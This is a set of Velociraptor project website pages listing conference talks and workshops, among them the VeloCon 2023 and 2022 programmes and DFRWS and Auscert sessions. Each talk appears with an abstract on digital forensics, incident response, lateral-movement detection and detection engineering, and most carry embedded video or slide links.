    <td style="border-top: 1px solid #000000" align="left" valign=bottom bgcolor="#000000"><b><font size=3 color="#FFFFFF">Speaker</font></b></td>
    <td style="border-top: 1px solid #000000; border-right: 1px solid #000000" align="left" valign=bottom bgcolor="#000000"><b><font size=3 color="#FFFFFF">Topic</font></b></td>
  </tr>
  <tr>
    <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom><font size=3 color="#000000">9:00-9:05</font></td>
    <td style="border-right: 1px solid #000000" colspan=2 align="center" valign=bottom><b><font size=3 color="#000000">INTRO</font></b></td>
  </tr>
  <tr>
    <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">9:05-10:00 am</font></td>
    <td align="left" valign=bottom><font size=3 color="#000000">Matt Green  <br>Principal Software Engineer, Velociraptor/Rapid7</font></td>
    <td style="border-right: 1px solid #000000" align="left" valign=bottom><font size=3 color="#000000">
      <a href="#content-management-like-a-boss">
        Content Management Like a Boss!
      </a></font></td>
  </tr>
  <tr>
    <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom><font size=3 color="#000000">10:00-10:45 am</font></td>
    <td align="left" valign=bottom><font size=3 color="#000000">Mike Cohen <br>Digital Paleontologist, Velociraptor/Rapid7</font></td>
    <td style="border-right: 1px solid #000000" align="left" valign=bottom><font size=3 color="#000000">
        <a href="#fast-dfir-with-velociraptor"> Fast DFIR with Velociraptor </a></font>
    </td>
  </tr>
  <tr>
    <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom><font size=3 color="#000000">10:45-11:00 am</font></td>
    <td style="border-right: 1px solid #000000" colspan=2 align="center" valign=bottom><b><font size=3 color="#000000">BREAK</font></b></td>
  </tr>
  <tr>

  <tr>
    <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">11:00-11:45 am</font></td>
    <td align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">Semanur Güneysu <br> SOC Analyst, IMPERUM</font></td>
    <td style="border-right: 1px solid #000000" align="left" valign=bottom><font size=3 color="#000000">
        <a href="#clawing-your-way-to-compliance-with-velociraptor">
          Empowering SOC Analysts with Velociraptor: Revolutionizing Live Response and Automation
        </a>
    </font></td>
  </tr>

  <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">11:45-12:30 pm</font></td>
  <td align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">Phalgun Kulkarni & Julia Paluch <br> DFIR Consultants, Aon</font></td>
  <td style="border-right: 1px solid #000000" align="left" valign=bottom><font size=3 color="#000000">
      <a href="#windows-search-index-the-forensic-artifact-youve-been-searching-for">
        Windows Search Index: The Forensic Artifact You’ve Been Searching For
        <a>
  </font></td>
  </tr>
  <tr>
    <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">12:30-1:00 pm</font></td>
    <td style="border-right: 1px solid #000000" colspan=2 align="center" valign=bottom bgcolor="#EFEFEF"><b><font size=3 color="#000000">LUNCH</font></b></td>
  </tr>
  <tr>
    <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom><font size=3 color="#000000">1:00-1:45 pm</font></td>
    <td align="left" valign=bottom><font size=3 color="#000000">Andreas van Leeuwen Flamino <br> SOC Team Lead, Oil & Gas</font></td>
    <td style="border-right: 1px solid #000000" align="left" valign=bottom><font size=3 color="#000000">
        <a href="#velociraptor-as-a-learning-tool">
          Velociraptor As A Learning Tool
        </a>
    </font></td>
  </tr>
  <tr>
    <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom><font size=3 color="#000000">1:45-2:30 pm </font></td>
    <td align="left" valign=bottom><font size=3 color="#000000">Wes Lambert </font></td>
    <td style="border-right: 1px solid #000000" align="left" valign=bottom><font size=3 color="#000000">
        <a href="#empowering-soc-analysts-with-velociraptor-revolutionizing-live-response-and-automation">
          Clawing Your Way To Compliance with Velociraptor
        </a>
    </font></td>
  </tr>
  <tr>
    <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">2:30-2:45 pm</font></td>
    <td style="border-right: 1px solid #000000" colspan=2 align="center" valign=bottom bgcolor="#EFEFEF"><b><font size=3 color="#000000">BREAK</font></b></td>
  </tr>
  <tr>
  <tr>
    <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">2:45-3:30 pm</font></td>
    <td align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">Phalgun Kulkarni & Kostya Ilioukevitch <br> DFIR Consultants, Aon</font></td>
    <td style="border-right: 1px solid #000000" align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">
        <a href="#tracing-the-footsteps-a-birds-eye-view-of-lateral-movement-using-velociraptor">
          Tracing the Footsteps: A Bird's Eye View of Lateral Movement Using Velociraptor
        </a>
    </font></td>
  </tr>
  <tr>
    <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom><font size=3 color="#000000">3:30-4:00 pm</font></td>
    <td align="left" valign=bottom><font size=3 color="#000000">Mike Cohen<br>        Digital Paleontologist, Velociraptor/Rapid7</font></td>
    <td style="border-right: 1px solid #000000" align="left" valign=bottom><font size=3 color="#000000">
        <a href="#">
          Year In Review/Future Roadmap
        </a>
    </font></td>
  </tr>
  <tr>
    <td style="border-bottom: 1px solid #000000; border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">4:00 pm</font></td>
    <td style="border-bottom: 1px solid #000000; border-right: 1px solid #000000" colspan=2 align="center" valign=bottom bgcolor="#EFEFEF"><b><font size=3 color="#000000">WRAP</font></b></td>
  </tr>
</table>


## Detailed Program

### Content Management Like a Boss!
By **Matt Green** - Principal Software Engineer, Velociraptor/Rapid7

Content management is one of the most under rated Velociraptor capabilities 
used by mature users. This talk will walk through some basics of content 
management, introduce automation and hopefully leave you with actionable 
ideas on how to do Velociraptor Content like a boss. 

<iframe width="1092" height="614" src="https://www.youtube.com/embed/DjMAri17-MI" title="VeloCon 2023:  Content Management Like a Boss!" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

### Fast DFIR with Velociraptor
By **Mike Cohen** - Digital Paleontologist

You have probably already heard of Velociraptor - the leading open
source DFIR platform! Velociraptor provides unprecedented deep
visibility into the endpoint with an impressive number of built in and
community contributed analysis modules - all available for free under
an open source license!  However, with all the capabilities that
Velociraptor comes with, it can be a little confusing to know exactly
which artifact to collect when responding to any one situation. This
can be even harder when the clock is ticking… while containing an
incident!


This is when a real world, practical walk through can be most
valuable! In this webcast, Mike Cohen, the lead developer of
Velociraptor will work through a typical DFIR investigation: Detecting
and containing an attacker who gains a foothold on a network. We will
examine techniques for hunting at scale for the attacker to identify
their foothold and reconstruct the event timeline. We then detect
attacker persistence to prevent re-infection.

There is something to learn for everyone: If you currently use
Velociraptor in your daily workflow you might learn some additional
artifacts you might be able to leverage. If you currently do not use
Velociraptor, this webinar will provide a demonstration of some of the
powerful capabilities that come bundled in this widely popular DFIR
tool!

<iframe width="1092" height="614" src="https://www.youtube.com/embed/ibl4-MzW-KI" title="VeloCon 2023:  Fast DFIR with Velociraptor" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

### Empowering SOC Analysts with Velociraptor: Revolutionizing Live Response and Automation

By: **Semanur Güneysu** - SOC Analyst, IMPERUM

In today's rapidly evolving threat landscape, SOC analysts are
constantly challenged to detect, respond to, and remediate security
incidents swiftly and efficiently. This presentation focuses on
designing automation playbooks while using Velociraptor’s features
that enable SOC analysts to enhance their capabilities: The
presentation begins by highlighting the significance of live response
in incident handling and investigations. We delve into the limitations
of traditional approaches and showcase how Velociraptor revolutionizes
the live response landscape. Through its open-source nature,
extensibility, and powerful query language, Velociraptor empowers SOC
analysts to perform real-time investigations and gather valuable
forensic data across endpoints, networks.  Additionally, the
presentation highlights the capabilities of the Velociraptor app
within the SOAR platform. We showcase how the Velociraptor app,
leveraging its API integration.This integration empowers SOC analysts
to leverage Velociraptor's powerful live response capabilities
directly within the IMPERUM platform, enhancing efficiency and
centralizing incident response efforts.With the integration of
Velociraptor and IMPERUM, SOC analysts can streamline incident
response workflows, automate repetitive tasks, and orchestrate complex
security operations seamlessly.  The presentation then underscores the
benefits of Velociraptor and live response automation. We emphasize
how these technologies improve the efficiency, accuracy, and speed of
incident response. By enabling SOC analysts to gather forensically
sound evidence, perform deep-dive investigations, and make data-driven
decisions, Velociraptor becomes a force multiplier in the SOC
ecosystem. Moreover, the integration of Velociraptor with IMPERUM
augments the effectiveness of incident response by enabling proactive
threat hunting, correlation of events, and automated remediation
actions.  Lastly, we discuss real-world use cases and success stories
that demonstrate the tangible impact of Velociraptor in live response
scenarios. Through these examples, we illustrate how SOC analysts can
effectively handle and mitigate security incidents, significantly
reducing the mean time to detect and respond and minimizing the
overall impact of cyber threats.  In conclusion, this presentation
highlights the transformative potential of Velociraptor and IMPERUM in
empowering SOC analysts. By combining the live response capabilities
of Velociraptor with playbooks, organizations can enhance their
incident response capabilities, strengthen their security posture, and
adapt to the ever-evolving threat landscape effectively.


<iframe width="1092" height="614" src="https://www.youtube.com/embed/uXWeWFQd0SM" title="VeloCon 2023: Empowering SOC Analysts with Velociraptor" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

### Windows Search Index: The forensic artifact you’ve been searching for

By **Phalgun Kulkarni** - DFIR Consultant - Aon
And **Julia Paluch** DFIR Software Developer - Aon


For examiners investigating cyber-crimes on Windows endpoints, the
Windows Search Index consists of rich information such as a user's
Internet history, emails, file interactions, and even deleted
data. Created as a tool to enable searching for files across the
Windows operating system, the Windows Search Index as a forensic
artifact provides insight into file existence and user activity. In
this presentation, we will discuss how the Windows Search Index can be
used as a source of evidence in DFIR investigations and how it can be
parsed at scale by integrating an open-source tool named SIDR (Search
Index Database Reporter) with Velociraptor.

This presentation will provide an overview of the data recorded in the
Windows Search Index by default and user actions that trigger
modifications of the index. Next, we will introduce the structure of
the index in Windows 10 and prior operating systems, and how it has
changed in Windows 11. We will also discuss use cases for the
information present in the index, such as finding evidence of website
access, deleted data, and activity from users of interest. Finally, we
will introduce SIDR (Search Index Database Reporter) and a
Velociraptor plugin, to parse the Windows Search Index at scale.

Attendees will gain a deep understanding of the Windows Search Index
structure, how it can be used as a forensic artifact, and the insights
it can provide to bolster the next investigation.

PSA: For reference please see
https://www.aon.com/cyber-solutions/aon_cyber_labs/windows-search-index-the-forensic-artifact-youve-been-searching-for/

SIDR available at https://github.com/strozfriedberg/sidr


<iframe width="1092" height="614" src="https://www.youtube.com/embed/zTRrxRJr7SA" title="VeloCon 2023: Windows Search Index: The forensic artifact you’ve been searching for" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

### Velociraptor As a Learning Tool

By: **Andreas van Leeuwen Flamino** -  Cyber Intelligence Center Team Lead, Flamino IR

The objective of this talk will be to persuade the audience to use
Velociraptor as a learning and teaching tool. The talk takes many cues
from my personal experience with Velociraptor. I have used it as a key
tool in the DFIR function at a mega event, and in high-profile
incident response engagements when I worked in an IR service delivery
team. I will cover how Velociraptor can be used as a learning and
teaching tool.

Part 1 - As a learning tool In this part of the presentation I will
expand how it helped me, someone who has a decent foundation and
experience with operating systems, become a better threat hunter,
incident responder and forensic analyst. I will cover how it helped
me:
- Become a better threat hunter, because the operator has to be
explicit when asking the tool questions. Really thinking through what
you are looking for sharpens the mind.
- Understand the limitations of commercial tooling;
- I will cover some advantages over typical EDRs, because Velociraptor
allows you to ask such diverse and specific questions.
- I will cover the advantages over forensic tooling, touching on the
speed and scale with which you can perform investigations, if forensic
soundness is not a hard requirement.
- Remove abstraction layers. Becoming more tool agnostic, and less
limited by commercial tooling feature sets.
- Understand the limitations of your own knowledge. Spotting gaps in
one’s own knowledge and understanding. For example, different hashes of
certain DLLs in an environment where all endpoints are created from the
same Golden Image with the same level of patching, can make one curious
why these DLLs are different. I will add more examples.
- Deepen practical understanding of the arts and science of digital
forensics and incident response. I can cover how I feel that delivering rapid
Incident Response engagements is an art, where creativity is a must, on top of
a solid foundation of the science of Operating Systems and computing
principles. Velociraptor allows the responder to get to work quickly, creatively
(by virtue of the wide variety of pivots it allows for) and intentionally.
- Lean how certain functionality is exposed to user land in Windows. By
virtue of having source code for artifacts.
- Understand how widespread vulnerabilities are, or how certain
exploits work. One example that comes to mind are the several Log4J artifacts
that were released around the time of that vulnerability being (re)discovered
and exploited en masse. Understanding how these artifacts are implemented
can greatly deepen the operator insight.
- Stand on the shoulders of great researchers. Explaining we don’t need to
know the fine details to get started. This is a nod back to a comment Mike
made in one of the Enterprise Hunting and Incident Response course videos.
- Understand how vulnerable a lot of software is, including software
from vendors that should know better. Unquoted service definitions for AV
agents, for example. I will add more examples.

Part 2 - As a teaching tool
In the second part I will cover how it helped make associate analysts
rapidly increase their exposure and experience. I will explain how I feel that
Velociraptor has some parallels to UNIX and Linux shell commands, in the
sense that it offers many core artifacts that can do one thing really well. If
the practitioner learns how each of these core artifacts works, and then
learns how to combine them, they can start to answer complex questions
quickly. Because this process is fluid (you can combine and dig deeper in
whatever interests you), it truly develops the qualities of being self-starting
and resourceful. I believe these two skills are foundational in many areas of
life.

The main thought I will expand on in the second part is how
Velociraptor can help interested junior associates become more senior
associates in a shorter amount of time. Some examples I will share are:
- Analyzing results of hunts on a regular basis, first perhaps only in Excel,
and later leveraging basic, and later more creative VQL statements.
- Digging deeper on endpoints to qualify alerts from other tools on an
ongoing basis to establish a much more thorough baseline.
- Being able to quickly pivot. For example, from looking at a potentially
malicious execution in UserAssist, to pulling MFT for a specific time window
to increase context. Or pulling authentication logs for that same time window
to see if there are any anomalies. All while not leaving the Velociraptor
interface.
- Removing dependency on the typical SOC chain of: typical commercial
endpoint tooling being installed and running > availability, and proper
definition of (custom) detection rules > event collectors, and all their possible
issues > SIEM > use-cases and their potential gaps > SOAR technologies that
are created with right intentions, but can also lead to tunnel vision, etc. Then
contrasting this to having one tool where you can ask questions across all
enrolled hosts and just dig into the result set yourself.
- Being closer to the OS because you are directly interacting with it.
- Reducing reliance on vendors and their support teams. I will add some
great examples of the power of the Velociraptor community, where
practitioners of diverse backgrounds and experience levels can easily find
each other and get answers. Contrasting this to using the support contract of
large commercial vendors where you often have to wait several days to get a
response that doesn’t go beyond what you can already read in the available
documentation yourself.
- Reducing reliance on automation and other people’s opinions and
enrichment. I will explain how enrichment isn’t bad, but that it’s great to not
only rely on third party enrichment to start.
- I will reiterate that when you combine all the above, you becoming more
resourceful and self-starting as a result.

<iframe width="1092" height="614" src="https://www.youtube.com/embed/KX6RV6rvY00" title="VeloCon 2023: Velociraptor As a Learning Tool" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

### Clawing Your Way To Compliance with Velociraptor

By **Wes Lambert** 

In this presentation, we’ll explore the multifaceted capabilities of Velociraptor as an endpoint visibility monitoring tool in meeting various security compliance standards. While compliance has traditionally been seen as a complex and arduous task, the application of innovative tools like Velociraptor can significantly streamline this process and ensure that organizations maintain their adherence to different cybersecurity policies. Cybersecurity compliance is increasingly being seen not just as an administrative burden, but as an essential component of an organization’s cybersecurity framework. Amid the ever-evolving cybersecurity landscape, compliance with the right security standards can help organizations mitigate threats and reduce risk. Velociraptor’s capacity to provide real-time, comprehensive visibility of endpoints makes it a vital instrument in achieving and maintaining security compliance.

Throughout the presentation, we’ll delve into the application of Velociraptor in creating a robust, efficient, and effective security compliance framework. We will illustrate how its features, like live response, artifact collection, and advanced querying capabilities can be leveraged to fulfill regulatory requirements. By highlighting specific case scenarios, we will demonstrate how Velociraptor’s ability to investigate security threats and breaches, and monitor security configurations, aligns with critical compliance needs. We’ll further examine how Velociraptor can support the different aspects of the compliance lifecycle. By enabling continuous monitoring and auditing of endpoints, Velociraptor can help organizations maintain an accurate inventory of assets, track and control configurations, identify and respond to security incidents, and conduct post-incident analyses, all of which are crucial to ensuring adherence to various security standards.

Continuing, we’ll discuss how the open-source nature of Velociraptor allows for customization and flexibility in responding to unique compliance requirements. Whether it’s creating custom artifacts to capture specific data or modifying existing artifacts to suit specific environments, Velociraptor provides the flexibility organizations need to meet compliance standards.

In conclusion, the presentation will underscore the significance of adopting a proactive, tool-supported approach to achieving compliance. By employing Velociraptor’s advanced endpoint visibility monitoring capabilities, organizations can not only demonstrate their adherence to required security standards but also enhance their overall cybersecurity posture. The insights shared during this presentation will be especially beneficial for security professionals and compliance officers seeking efficient ways to align their compliance strategies with dynamic cybersecurity needs. Through this exploration of Velociraptor’s potential in the compliance arena, attendees will gain a deeper understanding of how to leverage this powerful tool in their quest to maintain security compliance.

<iframe width="1092" height="614" src="https://www.youtube.com/embed/Az2_ljP7d00" title="VeloCon 2023: Clawing Your Way To Compliance with Velociraptor" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

### Tracing the Footsteps: A Bird's Eye View of Lateral Movement Using Velociraptor

By: **Phalgun Kulkarni** - DFIR Consultant
And **Kostya Ilioukevitch** - DFIR Sr. Consultant, Aon

One of the commonly asked questions by stakeholders and major goals
during an incident response investigation is to identify the systems
accessed by the threat actor; in short, identification of “Lateral
Movement.” Recently, our team has developed a new Velociraptor plugin
that goes deeper into a broader set of lateral movement artifacts to
provide examiners with more opportunities to detect threat actor
movement during investigations.

Typically, forensic examiners rely on Windows Event Logs to identify
lateral movement. While Windows Event Logs are a great source to
identify such activity, there may be a chance that the events may have
rolled over or certain event IDs are not enabled. Other artifacts such
as Windows UAL, Shellbags, Windows Registry, application configuration
files etc. can be utilized in addition to Windows Event Logs to
provide a more holistic overview into lateral movement activity within
a network.

This presentation focuses on: Introducing a brand-new Velociraptor
plugin that provides a holistic view of lateral movement across the
network.  A process to efficiently visualize lateral movement across
multiple systems.


This talk briefly discusses various Windows OS artifacts, including
the artifacts generated by remote access tools like WinSCP, that can
be analyzed using Velociraptor to identify lateral movement. We
categorize the artifacts into inbound (destination system artifacts)
and outbound (source system artifacts) access, making it easier to
identify the type of access. Additionally, we introduce a new Windows
lateral movement Velociraptor plugin that provides a better,
data-rich, and contextual view of lateral movement. This plugin builds
on the existing `Windows.Packs.LateralMovement` hunt by adding more data
such as the time, source host, destination host, and application while
supporting a more diverse set of artifacts such as Windows UAL,
Shellbags, Windows Registry ,and application configuration
files. Finally, we will also cover how to efficiently consume the
output generated by this plugin through tools that support data
visualizations.

Future implementations:

The current implementation of this plugin includes artifacts from
Windows systems. It can be further enhanced by including lateral
movement artifacts from Linux environments.

Attendees will gain:

Knowledge about various lateral movement artifacts present on Windows
OS (including Remote Access Tools artifacts), which can be utilized to
identify the affected systems and Threat Actor’s movement in a
network.  The ability to efficiently consume the data generated by our
Velociraptor plugin through data visualizations.

<iframe width="1092" height="614" src="https://www.youtube.com/embed/WS6yzwcZ9ZE" title="VeloCon 2023: Tracing the Footsteps: A Bird’s Eye View of Lateral Movement Using Velociraptor" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
---END OF FILE---

======
FILE: /content/presentations/2021_auscert/_index.md
======
---
title: Auscert Workshop 2021
menutitle: Auscert 2021
weight: 5
no_menu: true
---

This talk was given at the Annual Auscert conference as a long form (4h) workshop
https://2021.conference.auscert.org.au/index.html

## Slides

<iframe src="https://docs.google.com/presentation/d/e/2PACX-1vTrR6J-o3TTcNEjHSstzJG1_mc3Fltv-OP00x-0_KRoOS4ZJltPBkF22ESPaTpYozMNVwk4WMp4yG0b/embed?start=false&loop=false&delayms=3000" frameborder="0" width="960" height="569" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe>

---END OF FILE---

======
FILE: /content/presentations/2022_dfrws_us/_index.md
======
---
title: DFRWS US 2022
menutitle: DFRWS US 2022
weight: 40
no_menu: true
---

At DFRWS US 2022, Mike gave a 4 hour workshop. Below you will find the
slides.

## Workshop: Velociraptor: Digging Deeper (4 Hours)

Velociraptor is an advanced open source digital forensic and incident
response tool that enhances your visibility into your
endpoints. Featuring scalable architecture it makes it possible to
hunt for forensic artifacts across large networks in minutes.

This workshop is an introduction to Velociraptor and how DFIR
practitioners can leverage the Velociraptor Query Language (VQL) to
implement novel detections in minutes.

You will download and install Velociraptor, then deploy a new
deployment and become familiar with the GUI. Experience the power of
scaling a hunt across a large network (over 1,000 endpoints). We then
continue to post process the data to quickly identify anomalies.

Specifically, we will looking at the new Velociraptor dead-disk
analysis mode which allows Velociraptor to be used on more traditional
disk images. This way we can reuse our VQL artifacts on live systems,
as well as disk images. We will also look at the limitations of this
technique.

We cover some case studies in modern DFIR techniques exposing
artifacts such as hunting memory for Cobalt Strike beacons, detecting
lateral movement through forensic artifacts, and leveraging ETW to
gain deeper visibility of endpoint activity.

This workshop will be hands on and include examples you should run on
your own windows VM. All you need to participate is a Windows VM
(e.g. a cloud instance or local VM).

Participants will learn
1. How to install Velociraptor locally
2. The basics of the Velociraptor Query Language (VQL)
3. How to apply community queries from the Artifact Exchange
4. Hunting large number of machines for compromise in minutes
5. Use Velociraptor artifacts on hard disk images.

Participants will need their own windows VM or cloud machine (with
admin level access) and will download Velociraptor from Github to
install it on that machine.

There will also be a small disk image to play with which should not
take too long to download.

https://dfrws.org/presentation/velociraptor-digging-deeper/

<iframe src="https://docs.google.com/presentation/d/e/2PACX-1vSmPYSSS7WiOcscMYtryFl4gVUCdT2VgvY_BtTmTkV9xyFAO87jbrFm85jcNXpxj7cVXEst2v6cGoYR/embed?start=false&loop=false&delayms=3000" frameborder="0" width="1280" height="749" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe>

---END OF FILE---

======
FILE: /content/presentations/2021_dfrws_us/_index.md
======
---
title: DFRWS US 2021 Workshop
linktitle: DFRWS US 2021 Workshop
weight: 10
no_menu: true
---

This workshop will be hosted on [Thursday, July 15 2021](https://dfrws.org/usa-2021-program/). It will be delivered
remotely so you can attend from the comfort of you preferred place.

## Requirements

To follow along, all you will need is a Windows system or Virtual
Machine (for example Windows 10, or Windows server edition) with
administrator level access. You can obtain a suitable VM from your
favorite cloud provider or run the VM locally.

## Video

<iframe width="560" height="315" src="https://www.youtube.com/embed/PiYPLEjYXnw" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

## Slides

<iframe src="https://docs.google.com/presentation/d/e/2PACX-1vQPVQPr3TvDJGBTxdFJqG_ZXeNs6pvrBDqNn46levEkJ6HGbVA9Ay33RaTzpXiyaqnQq1Zim3Lh2msf/embed?start=false&loop=false&delayms=3000" frameborder="0" width="960" height="569" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe>

---END OF FILE---

======
FILE: /content/presentations/2024_auscert-detection-engineering/_index.md
======
---
title: Advances in Detection Engineering
menutitle: Auscert 2024 Talk
weight: 130
---

### Abstract

As defenders, we rely on having an efficient and effective detection
capabilities so we can shut down attacks quickly before the damage is
done. To do this effectively, defenders rely on automated detection,
driven by specific rules. While there are many detection platforms
available with different ways of writing rules, there is a lot of
commonality in the type of rules that are needed for effective
detection - this new discipline is called "Detection Engineering".

This talk gives the technological background to current detection
engineering techniques. How can we write effective detection rules
within the capabilities of our current detection platforms?

Detection capabilities are slowly migrating from a purely centralized
detection engines that process forwarded events from the endpoint, to
a more endpoint focused detection capabilities where the endpoint can
autonomously enrich and respond to detection rules.

The advantage of a fully distributed approach is that detection rules
can now consider many more types of signals from endpoint state in the
detection process. This leads to higher fidelity signals and much
higher accuracy.

As an example of detection engineering, this talk focuses on the Sigma
Detection rule notation - an open source rule interchange
format. Sigma was designed to be vendor agnostic and can be used to
write generic rules which can be applicable to many different
detection engine backends

While traditional centralized detection systems rely on log forwarding
from the endpoint, modern endpoint specific detections can look at
wider signals, such as system configuration, process memory, process
state. As detection capabilities improve, Sigma can be evolved to
accommodate more powerful endpoint detection systems, by incorporating
more powerful sources of information only available on the endpoint.

Finally we discuss how Sigma can be extended to include automated
remediation capabilities for autonomous endpoint response. For
example, killing suspicious processes, placing the system under
quarantine or other mitigation steps.

### Slides

<iframe src="https://present.velocidex.com/presentations/2024-auscert-detection_engineering/index.html" frameborder="0" width="980px" height="600px" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe>

[Full Screen](https://present.velocidex.com/presentations/2024-auscert-detection_engineering/index.html)

## Video

<iframe width="560" height="315" src="https://www.youtube.com/embed/-emRIFYhD60?si=XCGlkZnpVeSNGo_Q" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

---END OF FILE---

======
FILE: /content/presentations/2022_velocon/_index.md
======
---
title: Velocon 2022
menutitle: Velocon 2022
weight: 75
---

On Sept 15, 2022 We held our first VeloCon - a day-long virtual summit
as we DIG DEEPER TOGETHER!

Here are the talks and recordings from the day.

{{< toc >}}

## Velociraptor year in review
By Mike Cohen

<a href="https://present.velocidex.com/presentations/velocon_2022_year_in_review/" target="_blank">
    Slides!
</a>
<p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/ahUMgKZLHLk" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

## Notebook and VQL - data munging your way to victory!
By Matt Green

Velociraptor notebook is a feature that supercharges analysis and speeds up many components of incident response. New users are often intimidated by advanced VQL and don’t know where to start. This talk aims to shed some light on data manipulation in VQL and provide some practical examples that can be taken away for better artifacts and analysis.

<a href="https://docs.google.com/presentation/d/1Ev1o3nDmTyejOj2RDjiscRvV_SeS0E90ygrlZU0wsig" target="_blank">
    Full Screen
</a>
<p>
<iframe src="https://docs.google.com/presentation/d/1Ev1o3nDmTyejOj2RDjiscRvV_SeS0E90ygrlZU0wsig/embed?start=false&loop=false&delayms=3000" frameborder="0" width="560" height="315" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe>

<iframe width="560" height="315" src="https://www.youtube.com/embed/VoO7y65TOsE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>


## Velocistack: Swiftly Configuring a Streamlined Investigation Environment
By **Wes Lambert** - Principal Engineer, Security Onion Solutions

In this presentation, we’ll discuss Velocistack, a Docker-based, free
and open investigation stack centered around Velociraptor. The project
makes it super easy to spin up a local Velociraptor server with Docker
Compose, tied together with other services that complement
investigation and can benefit analysts or incident responders.

Want to post-process collection or hunt results outside of
Velociraptor?

Maybe it would be beneficial to be able to quickly and easily search
through the data and correlate with other data sets?

How about the ability to build detailed graphs and visualizations
around Velociraptor artifacts or metrics?

Would you like to be able to perform data decoding and transformation
using a variety of recipes, baking your data to perfection?

Want the ability to easily track investigations through native case
management, attaching evidence to cases, associate evidence/IOCs to
assets, and build greater context around collected data?

Want to better understand how to leverage Velociraptor’s “transparent
proxy” feature to host your own additional services behind it?

If you answered yes to any of these questions, then Velocistack may be
for you! To learn more about Velocistack, attend this presentation!

<iframe width="560" height="315" src="https://www.youtube.com/embed/IFChO6ER3_Y" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>


[Slides](https://drive.google.com/file/d/19Vpf1Wb5CzWEU44PJxz0sTiAbWHAdT_g/view?usp=sharing)

## Machine Learning for DFIR with Velociraptor: From Setting Expectations to a Case Study
By **Christian Hammerschmidt, PhD** - Head of Engineering/ML, APTA Technologies

Machine learning (ML) or artificial intelligence (AI) often comes with
great promise and large marketing budgets for cybersecurity,
especially in monitoring (such as EDR/XDR solutions). Post-breach, it
often turns out that the actual performance falls short of its
promises.

In this talk, we'll briefly look at ML for DFIR: What tasks can ML
solve, generally speaking? What requirements do we have for a useful
ML system in cybersecurity/DFIR contexts, such as reliability,
robustness to attackers, and explainability? What makes ML difficult
to apply in cybersecurity, e.g. when thinking about false alerts or
attackers attempting to circumvent automated systems?

After discussing the basics, we look at ML for velociraptor:

1. How can we process forensic data collected with VQL using machine
   learning (with a typical Python/Jupyter/scikit-learn/PyTorch
   stack)?

2. And how can we build artifacts that run ML directly on each
   endpoint, avoiding central data collection?

The talk concludes with a case study, showing how we significantly
reduced time to analyze EVTX files in incident response cases, saving
thousands of USD in costs and reducing time to resolution.

Bio: Chris Hammerschmidt did his PhD research on machine learning
methods for reverse engineering software systems. Now, he's heading
APTA Technologies, a start-up building machine learning tools to
understand software behavior .

Affiliation: APTA Technologies, https://apta.tech

<iframe width="560" height="315" src="https://www.youtube.com/embed/lFfAam4KLuY" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

[Slides](https://drive.google.com/file/d/1wtHAAi00CMGDj9d5nqcGD67MZR_XIkA2/view?usp=sharing)

## When Dinosaurs Ruled the Blue Team: Retrieving triage images with EDR
